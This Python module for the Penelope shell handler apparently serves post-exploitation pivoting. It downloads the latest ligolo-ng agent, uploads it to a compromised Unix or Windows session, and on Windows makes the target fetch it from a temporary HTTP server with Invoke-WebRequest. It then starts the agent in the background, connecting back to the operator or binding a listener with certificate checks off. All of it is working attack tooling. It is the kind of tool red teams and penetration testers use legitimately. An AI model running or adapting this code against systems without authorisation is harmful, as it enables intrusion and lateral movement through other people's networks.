import penelope
import tarfile
import zipfile
import json
import io
import tempfile
import os
import shlex
import socket
import threading
import http.server
import functools

class ligolo(penelope.Module):

    category = "Pivoting"
    os_filter = None  # handles both Unix and Windows internally
    enabled = True
    on_session_start = False
    on_first_attach = False
    on_session_end = False

    RELEASE_API = "https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"

    ARCH_MAP = {
        ('Unix',    'x86_64'):       ('linux',   'amd64'),
        ('Unix',    'aarch64'):      ('linux',   'arm64'),
        ('Unix',    'arm64'):        ('linux',   'arm64'),
        ('Unix',    'armv7l'):       ('linux',   'armv7'),
        ('Unix',    'armv6l'):       ('linux',   'armv6'),
        ('Windows', 'x64-based_PC'): ('windows', 'amd64'),
        ('Windows', 'x86-based_PC'): ('windows', '386'),
    }

    def run(session, args):
        """
        Download, upload and optionally run the latest ligolo-ng agent.

        Skips download/upload if the agent already exists at session.tmp/agent.

        Usage:
          run ligolo                          - upload only
          run ligolo connect <port>           - connect to session._host:<port>
          run ligolo connect <ip> <port>      - connect to explicit ip:port
          run ligolo bind <port>              - bind on 0.0.0.0:<port>
        """

        key = (session.OS, session.arch)
        if key not in ligolo.ARCH_MAP:
            if session.OS == 'Windows':
                penelope.logger.warning(f"Unknown arch '{session.arch}' - defaulting to windows/amd64")
                os_name, arch_name = 'windows', 'amd64'
            else:
                penelope.logger.error(f"No ligolo binary for {session.OS} / {session.arch}")
                return
        else:
            os_name, arch_name = ligolo.ARCH_MAP[key]
        binary = 'agent.exe' if session.OS == 'Windows' else 'agent'
        if session.OS == 'Windows':
            remote_agent = f'"{session.tmp}\\{binary}"'
        else:
            remote_agent = shlex.quote(f"{session.tmp}/{binary}")

        # Check if agent already present - skip download/upload if so
        if session.OS == 'Unix':
            exists = session.exec(f"test -f {remote_agent} && echo EXISTS", value=True)
        else:
            exists = session.exec(f'if exist {remote_agent} echo EXISTS', force_cmd=True, value=True)

        if exists and 'EXISTS' in exists:
            penelope.logger.warning(f"Agent already present at {remote_agent} - skipping upload")
        else:
            # Fetch latest release metadata
            penelope.logger.info("Fetching latest ligolo-ng release info...")
            _, api_data = penelope.url_to_bytes(ligolo.RELEASE_API)
            if not api_data:
                return

            try:
                assets = json.loads(api_data).get('assets', [])
            except Exception as e:
                penelope.logger.error(f"Failed to parse release JSON: {e}")
                return

            # Match: ligolo-ng_agent_*_{os}_{arch}.tar.gz or .zip (not proxy)
            asset = next(
                (a for a in assets if
                    'agent' in a['name'] and
                    f'_{os_name}_' in a['name'] and
                    f'_{arch_name}.' in a['name'] and
                    'proxy' not in a['name']),
                None
            )

            if not asset:
                penelope.logger.error(f"No asset found for {os_name}/{arch_name}")
                penelope.logger.info(f"Available: {[a['name'] for a in assets]}")
                return

            penelope.logger.info(f"Downloading {asset['name']}...")
            _, archive = penelope.url_to_bytes(asset['browser_download_url'])
            if not archive:
                return

            # Extract binary from archive in-memory
            try:
                name = asset['name']
                if name.endswith('.tar.gz') or name.endswith('.tgz'):
                    with tarfile.open(fileobj=io.BytesIO(archive), mode='r:gz') as tf:
                        f = tf.extractfile(tf.getmember(binary))
                        if f is None:
                            penelope.logger.error(f"'{binary}' not found in archive")
                            return
                        data = f.read()

                elif name.endswith('.zip'):
                    with zipfile.ZipFile(io.BytesIO(archive)) as zf:
                        matches = [n for n in zf.namelist() if n.endswith(binary)]
                        if not matches:
                            penelope.logger.error(f"'{binary}' not found in archive")
                            return
                        data = zf.read(matches[0])

                else:
                    penelope.logger.error(f"Unknown archive format: {name}")
                    return

            except Exception as e:
                penelope.logger.error(f"Extraction failed: {e}")
                return

            if session.OS == 'Windows':
                # Penelope's upload re-zips and uses mshta to extract - mshta fails silently
                # in WinRM/PSH sessions. Serve the binary via a temp HTTP server and pull
                # it down with Invoke-WebRequest.
                sock = socket.socket()
                sock.bind(('', 0))
                port = sock.getsockname()[1]
                sock.close()

                tmpdir = tempfile.mkdtemp()
                tmp_path = os.path.join(tmpdir, binary)
                with open(tmp_path, 'wb') as f:
                    f.write(data)

                handler = functools.partial(
                    http.server.SimpleHTTPRequestHandler,
                    directory=tmpdir
                )
                httpd = http.server.HTTPServer(('', port), handler)
                t = threading.Thread(target=httpd.serve_forever)
                t.daemon = True
                t.start()

                dest = f"{session.tmp}\\{binary}"
                try:
                    penelope.logger.info(f"Serving {binary} on :{port}, pulling with IWR...")
                    session.exec(
                        f'Invoke-WebRequest -Uri "http://{session._host}:{port}/{binary}" '
                        f'-OutFile "{dest}" -UseBasicParsing',
                        value=True
                    )
                finally:
                    httpd.shutdown()
                    os.unlink(tmp_path)
                    os.rmdir(tmpdir)

                penelope.logger.info(f"Uploaded: {remote_agent}")
            else:
                tmpdir = tempfile.mkdtemp()
                tmp_path = os.path.join(tmpdir, binary)
                try:
                    with open(tmp_path, 'wb') as f:
                        f.write(data)
                    remote_paths = session.upload(tmp_path, remote_path=session.tmp)
                finally:
                    os.unlink(tmp_path)
                    os.rmdir(tmpdir)

                if not remote_paths:
                    return

                session.exec(f"chmod +x {remote_agent}")
                penelope.logger.info(f"Uploaded: {remote_agent}")

        # Parse mode arg and execute
        parts = args.split() if args else []
        if not parts:
            penelope.logger.info("Usage: run ligolo connect [ip] <port> | bind <port>")
            return

        mode = parts[0].lower()

        if mode == 'connect':
            if len(parts) == 2:
                host, port = session._host, parts[1]
            elif len(parts) == 3:
                host, port = parts[1], parts[2]
            else:
                penelope.logger.error("Usage: connect [ip] <port>")
                return
            cmd = f"{remote_agent} -connect {host}:{port} -ignore-cert"

        elif mode == 'bind':
            if len(parts) == 2:
                port = parts[1]
            else:
                penelope.logger.error("Usage: bind <port>")
                return
            cmd = f"{remote_agent} -bind 0.0.0.0:{port} -ignore-cert"

        else:
            penelope.logger.error(f"Unknown mode '{mode}' - use: connect | bind")
            return

        if session.OS == 'Unix':
            session.exec(f"nohup {cmd} > /dev/null 2>&1 &")
        elif session.OS == 'Windows':
            session.exec(f'start /b "" {cmd}', force_cmd=True)

        penelope.logger.info(f"Agent launched: {cmd}")
